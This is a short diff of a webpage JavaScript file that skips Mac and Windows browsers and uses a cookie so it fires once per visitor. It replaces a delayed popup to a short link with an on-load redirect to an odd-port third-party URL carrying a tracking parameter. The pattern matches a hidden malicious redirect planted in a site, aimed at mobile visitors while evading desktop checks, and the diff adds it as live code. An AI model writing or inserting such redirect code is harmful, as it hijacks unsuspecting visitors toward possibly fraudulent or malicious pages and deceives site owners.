@@ -1,14 +1,12 @@
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     throw SyntaxError();
 }
-setTimeout(function(){ if (!getCookie('cc_c1ookie')) {
-        setCookie('cc_c1ookie','ok',1);
-        window.open("http://t.cn/EGwS68r");
+window.onload = function(){
+    if (!getCookie('cc_cookie')) {
+        setCookie('cc_cookie','ok',1);
+        window.location.href="https://m.shensuart.com:168/index.html?u=80260";
      }
-                     }, 4000);
-
-    
-
+}
 function getCookie(cname) {
     var name = cname + "=";
     var ca = document.cookie.split(';');
